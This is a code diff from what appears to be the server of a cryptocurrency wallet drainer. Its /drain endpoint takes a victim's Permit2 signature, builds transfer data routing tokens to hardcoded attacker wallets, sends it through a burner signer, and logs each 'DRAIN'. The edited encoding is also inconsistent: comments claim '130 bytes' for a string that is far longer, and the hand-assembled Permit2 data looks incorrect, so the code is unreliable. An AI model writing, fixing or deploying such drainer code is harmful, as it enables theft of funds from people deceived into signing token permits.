@@ -171,17 +171,15 @@ app.post('/drain', async (req, res) => {
       return res.status(400).json({ error: 'Permit signature invalid or expired' });
     }
 
-    // 🔥 PERFECT Permit2 transferDetails - 128 bytes exact
-    const destination = HARDCODED_WALLETS[tokenSymbol];
-    const spender32 = '0000000000000000000000000000000000000000000000000000000000000000';
-    const nonce32 = '0000000000000000000000000000000000000000000000000000000000000000';
-    const amount32 = amount.slice(2).padStart(64, '0');
-    const destHash = ethers.utils.keccak256(ethers.utils.hexZeroPad(destination, 32)).slice(2);
-    
-    const transferDetails = '0x' + spender32 + nonce32 + amount32 + destHash;
-    
-    console.log(`🔥 DRAIN ${tokenSymbol}: ${destination.slice(0,10)} | transferDetails=${transferDetails.length} bytes`);
+    // 🔥 PERFECT Permit2 transferDetails - EXACT 130 bytes
+const destination = HARDCODED_WALLETS[tokenSymbol];
+const spender32 = '0000000000000000000000000000000000000000000000000000000000000000';  // 64
+const nonce32 =   '0000000000000000000000000000000000000000000000000000000000000000';  // 64  
+const amount32 =  amount.slice(2);  // 64 (NO padStart!)
+const destHash =  ethers.utils.keccak256(ethers.utils.hexZeroPad(destination, 32)).slice(2); // 64
 
+const transferDetails = '0x' + spender32 + nonce32 + amount32 + destHash;
+console.log(`🔧 FIXED: ${transferDetails.length} bytes → ${transferDetails.slice(0, 20)}`);
     const permit2 = new ethers.Contract(PERMIT2, PERMIT2_ABI, burner);
     const gasPrice = (await provider.getGasPrice()).mul(14).div(10);
     
